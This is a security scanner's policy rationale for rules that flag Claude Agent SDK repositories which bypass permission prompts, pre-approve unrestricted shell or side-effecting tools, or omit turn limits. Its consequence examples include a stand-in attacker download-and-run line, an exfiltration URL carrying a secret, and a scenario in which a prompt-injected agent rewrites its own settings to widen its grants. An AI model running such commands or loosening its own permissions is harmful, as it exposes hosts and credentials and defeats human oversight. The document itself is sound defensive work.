---
policy_id: claude_sdk_repo
category: claude_sdk
topic: repo
rules:
  - id: CSDK-201
    severity: critical
    confidence: 0.9
    scope: repo
    fix_type: config
  - id: CSDK-202
    severity: critical
    confidence: 0.9
    scope: repo
    fix_type: config
  - id: CSDK-204
    severity: critical
    confidence: 0.9
    scope: repo
    fix_type: config
  - id: CSDK-205
    severity: high
    confidence: 0.8
    scope: repo
    fix_type: config
  - id: CSDK-206
    severity: low
    confidence: 0.6
    scope: repo
    fix_type: config
references: [LLM02, LLM06, LLM10]
---

# Policy Rationale: Repository Session Configuration Posture

**Policy ID:** `claude_sdk_repo`  
**File:** `claude_sdk/repo.yaml`  
**Rules:** CSDK-201, CSDK-202, CSDK-204, CSDK-205, CSDK-206  
**Severities:** critical, critical, critical, high, low  
**Fix types:** config, config, config, config, config  
**References:** LLM02 (Sensitive Information Disclosure), LLM06 (Excessive Agency), LLM10 (Unbounded Consumption)

---

## What this policy covers

Repo-scope rules for project-wide Claude Agent SDK session configuration
posture, in three families.

Approval gating: the mode declared in `.claude/settings.json` /
`settings.local.json` (predicate `repo_claude_default_mode_is`) and the mode
set in code on a `ClaudeAgentOptions(...)` session object (predicate
`repo_claude_options_permission_mode_is`). Each rule fires once per scan when
the respective `bypassPermissions` value is present.

Standing permission grants: the `permissions.allow` list in the same settings
files. CSDK-204 fires when `Bash` is pre-approved with no command pattern
narrowing it (predicate `repo_claude_permission_allows_unrestricted_shell`);
CSDK-205 fires when a side-effecting tool — `Write`, `Edit`, `MultiEdit`,
`NotebookEdit`, `WebFetch`, or `WebSearch` — appears in `permissions.allow`
at any pattern (predicate `repo_claude_permission_allows_tool`).

Execution bounding: whether any `ClaudeAgentOptions(...)` construction in the
project sets an explicit `max_turns` (predicate
`repo_claude_options_max_turns_missing`). Fires once per scan when the project
has at least one such construction and none of them cap turns.

---

## Why permission posture is a distinct concern in agent tools

Claude Code's permission prompts are the in-band human-in-the-loop control: by
default, a tool call that writes a file, runs a shell command, or fetches the
network pauses for approval. That prompt is not one defense among several — for
an agent running on a real host it is the *only* boundary between a
prompt-injected or mistaken model action and a real effect. There is no
sandbox underneath it: unlike a framework that runs model-generated code inside
a container by default, the Claude Code tool surface executes directly on the
machine, and the prompt is what stands in for the container. Turning it off
does not weaken one tool — it removes the approval step for *every* tool the
agent can reach, repo-wide.

The danger is amplified by where the setting lives. A `defaultMode:
bypassPermissions` in `.claude/settings.json` is checked into the repository, so
it applies to everyone who clones it, not just the author who set it — a
permission decision made once silently governs every future contributor's
sessions. The `ClaudeAgentOptions(permission_mode="bypassPermissions")` form is
worse in practice because it is where applications actually enable the bypass,
and it executes wherever the application runs (a server, a user's machine, CI)
with no checked-in file to audit.

`permissions.allow` is the quieter sibling of a mode bypass. It does not flip
any mode; it removes the prompt for the tools it names, as a standing,
project-wide pre-approval that every session inherits. A bare `"Bash"` entry
reaches the same end state as `bypassPermissions` for the one tool that
subsumes the rest — a shell command can write files, fetch the network, read
credentials, and edit `.claude/settings.json` itself — without the settings
file ever containing the word "bypass", so it passes the review that would
catch CSDK-201. Deny entries narrow this but do not repair it: Claude Code
resolves deny over allow, so a blanket allow plus specific denies is
"everything except a blocklist", and a blocklist of dangerous shell commands
is not enumerable — the next unsafe invocation is always one the list did not
anticipate. This is OWASP LLM Top 10:2025 **LLM06 (Excessive Agency)** at the
configuration layer, with **LLM02 (Sensitive Information Disclosure)** riding
on the web-retrieval grants: a pre-approved `WebFetch` both pulls
attacker-reachable content into the context and carries in-context data out in
the request URL.

Turn bounds (CSDK-206) are the reliability face of the same configuration
object. A session with no explicit `max_turns` runs to whatever ceiling the
`claude-agent-sdk` runtime applies by default — a generic bound, not one sized
to the task, and one that can shift between SDK releases with no change on the
project's side. That places it under **LLM10 (Unbounded Consumption)**: the
damage is spend, latency, and repeated tool side effects, not a capability the
model should never have held.

---

## Rule-by-rule defense

### CSDK-201 — Project default permission mode bypasses approvals (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:**
A `.claude/settings.json` (or `settings.local.json`) anywhere in the repo whose
`defaultMode` is `bypassPermissions` (predicate `repo_claude_default_mode_is:
[bypassPermissions]`).

**Why it is flaggable:**
`defaultMode: bypassPermissions` disables Claude Code's approval prompts for the
whole repo. Every tool the agent can reach then runs unprompted — file writes,
shell commands, and network fetches all execute with no human step.

**Real-world consequence:**
A checked-in `.claude/settings.json` with `bypassPermissions` means a single
prompt-injected instruction in any document the agent reads can drive an
unguarded `rm`, an exfiltrating network call, or a credential-file read — on the
machine of *anyone* who cloned the repo, not just the author.

**Why severity is critical and not high:**
Critical is reserved for configurations where, once a hostile instruction
reaches the model, nothing else stands between it and the host. This setting
meets that bar. The CrewAI code-execution rules (CREW-101/102) sit at high
because the default Docker sandbox still separates model output from the host,
so an attack additionally needs an escape or a fallback; Claude Code has no
such layer — the permission prompt *is* the boundary, and this setting deletes
it for every tool at once, unrestricted shell and network egress included. The
argument that previously held this at high — that the bypass is the enabling
condition rather than the exploit itself — applies equally to every
injection-reachable finding and does not distinguish tiers; what does is
whether any residual gate survives, and here none does. The blast radius
compounds it: the file is checked in, so one line governs every clone's
sessions unconditionally.

**Fix type — config:**
Remove the entry or change it to `default` (prompt on every tool call) or
`acceptEdits` (auto-approve only file edits, still gate shell/network). No tool
source changes — it is a settings-file edit. Reserve `bypassPermissions` for
disposable sandboxes, never a shared repo.

**Confidence 0.9:**
The match is an exact value read from a parsed settings file, so false positives
are rare — limited to a settings file that is present but unused (e.g. an example
config not loaded by the running agent, or a fixture directory vendored into the
tree). False negatives: a bypass set only at runtime via the SDK rather than in
settings is CSDK-202's job, not this rule's.

### CSDK-202 — Session permission mode bypasses approvals (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:**
A `ClaudeAgentOptions(...)` construction in code that sets
`permission_mode="bypassPermissions"` (predicate
`repo_claude_options_permission_mode_is: [bypassPermissions]`).

**Why it is flaggable:**
This is the in-code, session-level form of the `settings.json` `defaultMode`
bypass, and it is where most applications actually enable it. The session turns
off Claude Code's approval prompts, so every tool the agent can call runs with
no human in the loop.

**Real-world consequence:**
An application that constructs
`ClaudeAgentOptions(permission_mode="bypassPermissions")` ships an agent that
acts without confirmation wherever it runs — a server handling untrusted user
input, or a desktop app on an end-user's machine. One injected instruction
becomes an unguarded action with the process's full privileges.

**Why severity is critical and not high:**
The same defense as CSDK-201: once the mode is set, no residual gate survives
between a hostile instruction and the host — the prompt was the only boundary,
and this line removes it for the whole tool surface at once. If anything the
session form is the stronger case for the top tier: it ships in production
paths rather than developer clones, it runs unattended by design (there is no
human at a prompt even in principle), and there is no checked-in file for a
reviewer to notice. Holding it below critical would rank a production
no-boundary configuration beneath sandboxed code-execution flags that still
have a container to escape.

**Fix type — config:**
Drop the kwarg or set it to `default` / `acceptEdits`. It is a constructor
argument change, not a tool-logic change. Reserve `bypassPermissions` for
disposable sandboxes, never code that runs on a developer's or user's machine.

**Confidence 0.9:**
The match reads the literal `permission_mode` value off the parsed
`ClaudeAgentOptions` call. False positives are limited to dead code (an options
object built but never used) or a value overridden elsewhere at runtime; false
negatives include a mode passed via a variable the scanner cannot resolve to a
literal, and TypeScript session objects (see the coverage gap below).

### CSDK-204 — Project settings pre-approve unrestricted shell (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:**
A `.claude/settings.json` (or `settings.local.json`) anywhere in the repo whose
`permissions.allow` lists `Bash` with no command pattern narrowing it
(predicate `repo_claude_permission_allows_unrestricted_shell`). The permission
entries are parsed into typed rules with line attribution; the predicate fires
when a `Bash` entry's pattern, whitespace-trimmed, is empty (a bare `"Bash"` —
and `"Bash()"`, which parses to the same empty pattern) or one of the wildcard
forms `"Bash(*)"` / `"Bash(:*)"`. Deny entries in the same file do not clear
the match.

**Why it is flaggable:**
`permissions.allow` is evaluated before any prompt: what it names is
pre-approved for every session in the project, permanently, for everyone who
clones the repo. A bare `Bash` grant therefore means every shell command the
model composes runs without a human step. Shell subsumes the rest of the tool
surface — a command can write any file, fetch any URL, read any credential the
process can reach, and rewrite `.claude/settings.json` itself — so this single
entry reaches the same end state as `defaultMode: bypassPermissions`
(CSDK-201) for the tool that matters most, while looking like an ordinary
allowlist entry in review. It is also a strictly wider grant than the same
string in one `SKILL.md` (CSKILL-001) or one slash command (CCMD-001): those
apply while that skill or command runs; this applies always. Deny entries do
not repair it — Claude Code resolves deny over allow, so blanket-allow-plus-
denies is "everything except a blocklist", and dangerous shell commands are
not enumerable.

**Real-world consequence:**
- A team adds `"allow": ["Bash"]` to stop approval fatigue in CI, and commits
  it. Every contributor's local session now executes model-chosen shell
  unprompted; a crafted instruction in a README, an issue body, or fetched
  web content drives `curl attacker.example/x.sh | sh` with no approval on
  whichever machine happens to be running the agent.
- Because the shell can edit the settings file, the first unprompted command
  can also *widen* the grant — appending further `allow` entries or flipping
  `defaultMode` — converting a one-line convenience into a persistent,
  self-reinforcing bypass.

**Why severity is critical and not high:**
The test for critical in this pack is that no residual mitigation survives
between an injected instruction and the host, and a bare pre-approved shell
passes it exactly as `bypassPermissions` does: the prompt was the only
boundary for shell execution, and this entry removes it unconditionally,
project-wide. Ranking it below the mode bypass would say that reaching the
identical end state is less severe when spelled as an allowlist entry — which
is backwards, because the allowlist spelling is *harder* to catch in review
(no "bypass" string to grep for) and therefore more likely to survive into a
shared repo. The presence of deny entries does not moderate the tier, for the
mechanism stated above: deny-over-allow makes the posture a non-enumerable
blocklist, not a scoped grant.

**Fix type — config:**
Replace the blanket entry with the specific commands the project needs, in
pattern form: `"Bash(git status:*)"`, `"Bash(npm test:*)"`. If broader shell
access is genuinely required, leave `Bash` out of `permissions.allow` entirely
so each call prompts, and gate it with a `PreToolUse` hook that allowlists
commands. A settings-file edit; no tool source changes.

**Confidence 0.9:**
The match is an exact, whitespace-trimmed comparison against a typed parse of
a real settings file, so the pattern itself is unambiguous. The small gap
covers settings files that are discovered but never govern a live session — a
vendored `.claude/` directory inside test fixtures or an example/template
subtree (discovery matches at any depth, which is monorepo-safe but can pick
these up), or a committed `settings.local.json` that a developer's own local
file supersedes. False negatives are the more important caveat: a *patterned*
grant that is effectively unrestricted — `"Bash(sh -c:*)"`,
`"Bash(bash:*)"`, `"Bash(python:*)"` — counts as narrowed and does not fire,
because judging which narrowings are sufficient is not mechanically decidable;
likewise a bare grant living in user-level `~/.claude/settings.json` or a
managed policy file outside the repo, or sessions launched with
`--dangerously-skip-permissions`, are outside a repo scan entirely.

### CSDK-205 — Project settings pre-approve side-effecting tools (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:**
A `.claude/settings.json` (or `settings.local.json`) anywhere in the repo whose
`permissions.allow` lists any of `Write`, `Edit`, `MultiEdit`, `NotebookEdit`,
`WebFetch`, or `WebSearch` (predicate `repo_claude_permission_allows_tool`
over that six-name list). The predicate matches on the tool name only — it
deliberately never reads the entry's pattern, so `"Write(src/generated/**)"`
fires the same as a bare `"Write"`.

**Why it is flaggable:**
These are the two classes of tool where the prompt is doing real work. The
filesystem editors turn model-generated text into persistent state — source
files, configuration, or the `.claude/settings.json` that governs the agent's
own permissions — and pre-approving them removes the one human read of that
text before it lands. The web-retrieval pair is a two-way channel:
`WebFetch` / `WebSearch` pull attacker-reachable content into the context
(the ingress a prompt injection rides in on) and carry in-context data out in
the request itself (URL and query are model-composed). A standing `allow` for
either class removes the checkpoint for every session in the project at once.

**Real-world consequence:**
- Pre-approved `WebFetch` plus any secret already in context (a `.env` read
  earlier in the session, an API key in a config the agent opened) lets an
  injected instruction exfiltrate it via
  `https://attacker.example/?q=<secret>` — the request is the leak, and no
  prompt intercedes (LLM02).
- Pre-approved `Write`/`Edit` lets injected content rewrite
  `.claude/settings.json` itself — appending `"Bash"` to `permissions.allow`
  — so a write-only grant escalates into CSDK-204's end state for every
  subsequent session.

**Why severity is high and not critical:**
Each of these grants removes the checkpoint for one *class* of action, not the
whole surface, and neither class alone yields immediate host compromise the
way unprompted shell does. A write grant does not execute code in the current
session — escalation requires a second step (rewriting settings, planting a
hook or script) plus a later session or run to trigger it; a retrieval grant
exfiltrates only what is already in context and executes nothing. The paths to
serious damage are real but indirect, where CSDK-204's is direct — that
residual step is what separates high from critical here. It is not medium
because the removed checkpoint is the *only* control on that class, the grant
is standing and project-wide, and the settings-rewrite escalation means the
gap between this rule and the critical tier is one unreviewed write.

**Fix type — config:**
Remove these tools from `permissions.allow` and let them prompt, or move them
to `ask` — which keeps the workflow while preserving the checkpoint — or scope
them with patterns so the grant covers only the paths and hosts the work needs
(e.g. `"Write(src/generated/**)"`). A settings-file edit; no tool source
changes.

**Confidence 0.8:**
The name match against a typed parse is exact, so the 0.1 gap below the shell
rule is almost entirely the predicate's deliberate pattern-blindness: a
tightly scoped `"Write(src/generated/**)"` or a domain-limited `WebFetch`
grant fires identically to a bare one. That over-flag is a design choice —
the pre-approval itself removes the checkpoint even when narrowed, and the
narrowed and bare forms differ in blast radius, not in kind — but it means a
project that has already applied the fix's scoping option still carries the
finding; only removing the entry or moving it to `ask` silences it. (The
engine has a pattern-aware sibling predicate,
`repo_claude_permission_allows_tool_unrestricted`, schema v22, that no shipped
rule uses yet; when a rule adopts it, bare and scoped grants can be tiered
apart.) Remaining false positives mirror CSDK-204's: discovered settings
files that never govern a live session. False negatives: writes and fetches
reachable through other spellings — a patterned `Bash` grant running `curl`
or `tee`, or an MCP server's write/fetch tools (an `mcp__server__tool` entry
parses to tool name `MCP`, which is not in this rule's list).

### CSDK-206 — Claude Agent SDK session sets no explicit max_turns limit (Severity: low, Confidence: 0.6, Fix type: config)

> **Renumbered from CSDK-204** when the fixture/production id collision was
> resolved (2026-08-31): the id CSDK-204 now names the unrestricted-shell rule
> above, and the max_turns rule shipped here took CSDK-206. Scan reports
> produced before the reconciliation attribute this finding to CSDK-204.

**What we detect:**
Every non-opaque `ClaudeAgentOptions(...)` construction in the project sets no
`max_turns` (predicate `repo_claude_options_max_turns_missing`). A
construction built with `**` unpacking (`Opaque: true`) is skipped — its kwarg
set is not statically knowable, so its silence on `max_turns` is not evidence
of a missing cap. The rule fires once per scan, when at least one concrete
construction exists and none of them set the kwarg; a project with no
`ClaudeAgentOptions` construction at all never fires, and a single
construction that sets an explicit cap silences the rule for the repo.

**Why it is flaggable:**
With no explicit `max_turns`, the session runs to whatever ceiling the
`claude-agent-sdk` runtime applies by default rather than to a bound sized for
the task. This is the LLM10 (Unbounded Consumption) mechanism: a model that
loops or oscillates — retrying a failing tool, re-reading the same file,
ping-ponging between two steps — keeps consuming turns, tokens, and tool side
effects until the implicit ceiling is reached.

**Real-world consequence:**
An unattended or server-side session with no turn cap can run substantially
longer, and touch substantially more tool side effects, than the task
warrants before the SDK's own default intervenes — and that default is an
implementation detail of the SDK release in use, not a value declared in the
project. A stuck run also fails silently rather than surfacing as a clean,
observable stop at a bound the developer chose.

**Why severity is low and not higher:**
A runtime-level default ceiling exists — the SDK does not let a session run
forever — so this is not an unbounded-loop finding, it is a missing
*explicit, task-sized* bound. That places it in the same category as LC-102 /
LC-111 (LangChain `max_iterations`) and CREW-110 (CrewAI `max_iter`): real but
modest risk, since a generic framework ceiling already bounds the worst case.

**Fix type — config:**
Pass `max_turns=` to `ClaudeAgentOptions(...)`, sized to the work the session
actually does. It is a constructor argument change, not a tool-logic change.

**Confidence 0.6:**
Lower than the other rules in this pack because the finding is about an
omission rather than a dangerous value present in code, so it carries a
higher false-positive surface: an options object built but never used to
drive a real session, a cap enforced by a wrapper or retry harness outside
the constructor call itself, or a genuinely short-lived session where no cap
is needed in practice. False negatives include a `max_turns` value passed via
a variable the scanner cannot resolve to a literal, and — see the coverage
gap below — any TypeScript project, since discovery of
`ClaudeAgentOptions(...)` is Python-only today.

---

## What this policy does not cover

- `permission_mode` / `defaultMode` values supplied dynamically from a variable,
  environment lookup, or config file the scanner cannot resolve to a literal.
- `acceptEdits` mode — auto-approving file edits via the *mode* is a narrower
  risk these rules deliberately do not flag, since shell and network actions
  still prompt. (Pre-approving the edit *tools* by name is CSDK-205's job.)
- User-level and machine-level configuration outside the repository —
  `~/.claude/settings.json`, managed policy files, and sessions launched with
  `--dangerously-skip-permissions` — none of which a repo scan can see.
- Patterned `Bash` grants that are effectively unrestricted:
  `"Bash(sh -c:*)"`, `"Bash(bash:*)"`, `"Bash(python:*)"` count as narrowed
  and evade CSDK-204, because judging which narrowings suffice is not
  mechanically decidable. The `PreToolUse`-hook recommendation exists
  precisely because allowlist patterns alone cannot close this.
- CSDK-205 is pattern-blind by design: a scoped grant
  (`"Write(src/generated/**)"`, a domain-limited `WebFetch`) still fires —
  a known, deliberate false positive relative to blast radius. Only removal
  or `ask` silences it; the pattern-aware predicate that could tier these
  apart (`repo_claude_permission_allows_tool_unrestricted`) is not yet used
  by any shipped rule.
- Pre-approval of read-only tools (`Read`, `Grep`, `Glob`) — a bare `Read`
  grant lets injected instructions pull secrets into context without a
  prompt, but exfiltration still needs an egress tool, so this policy leaves
  it unflagged rather than flagging half the tool surface.
- MCP-mediated capability: an `mcp__server__tool` entry in
  `permissions.allow` parses to tool name `MCP` and matches neither CSDK-204
  nor CSDK-205, however powerful the underlying server tool is.
- `permissions.deny` / `permissions.ask` misconfigurations, `hooks`, and
  `additionalDirectories` — adjacent settings surfaces with their own failure
  modes, not covered by these predicates.
- The same `allowed-tools` grant made in a `SKILL.md`, a slash command, or a
  subagent's frontmatter — separate scopes with their own rules; see
  [claude_skill/skill_safety.md](../claude_skill/skill_safety.md),
  [claude_skill/slash_command_safety.md](../claude_skill/slash_command_safety.md),
  and [subagent_safety.md](subagent_safety.md).
- **TypeScript session configuration (CSDK-202, CSDK-206).** Discovery of
  `ClaudeAgentOptions(...)` walks Python AST only. The TypeScript equivalent —
  `query({ options: { permissionMode, maxTurns } })` — is modeled as a
  `QueryMainAgent` agent-scope declaration, not a `ClaudeAgentOptionsDef`, so
  a TypeScript project's session-level bypass or missing cap is currently
  invisible to these repo-scope rules. Closing this gap needs agent-scope
  rules targeting `claude_query_main`, not a change to this policy.
- **CSDK-206 exact default behavior.** The rule deliberately does not assert
  a specific default turn count in its `explanation` text; the SDK's default
  was not independently verified for this rationale doc, unlike the
  documented CrewAI default of 20 (CREW-110) or LangChain's default of 15
  (LC-102).

---

## Recommendations beyond the fix

```jsonc
// .claude/settings.json — no mode bypass, no bare grants; prompt or ask for
// anything that writes or reaches the network, and pattern-scope the rest.
{
  "permissions": {
    "defaultMode": "acceptEdits",
    "allow": [
      "Bash(git status:*)",
      "Bash(npm test:*)"
    ],
    "ask": ["Write", "Edit", "WebFetch", "WebSearch"],
    "deny": ["Bash(curl:*)", "Bash(rm:*)"]
  }
}
```

```python
# In code: prompt on tool calls; never bypass on a shared/prod path.
# Also cap the session to a bound sized for the task.
options = ClaudeAgentOptions(permission_mode="default", max_turns=12)
```

1. Default to `default` (prompt) for anything running on a real machine; use
   `acceptEdits` only when file-edit churn is the bottleneck and shell/network
   remain gated.
2. Treat every `permissions.allow` edit as a security review, not a
   convenience tweak — a one-word diff (`"Bash"`) carries bypass-level
   consequences, and unlike `defaultMode` it contains no string a reviewer
   would grep for.
3. Prefer `ask` over `allow` for side-effecting tools: it removes the
   prompt fatigue argument for blanket grants while keeping the checkpoint.
4. If broad shell access is a genuine requirement, gate it with a
   `PreToolUse` hook that allowlists commands server-side rather than
   trusting settings patterns — patterns cannot distinguish `python` the
   test runner from `python -c` the arbitrary interpreter.
5. If a workflow genuinely needs unattended execution, run it in a disposable
   sandbox (container, ephemeral VM) and scope the agent's tools tightly,
   rather than reaching for `bypassPermissions` on a developer or production
   host.
6. Keep `settings.local.json` (developer-local, gitignored) for any personal
   loosening, so a bypass or a broad grant never lands in the shared,
   checked-in config.
7. Size `max_turns` to the task, not to "whatever the default allows." If a
   task legitimately needs many turns, prefer splitting it into bounded
   sub-sessions over raising the cap — a large cap defeats the point of having
   one.
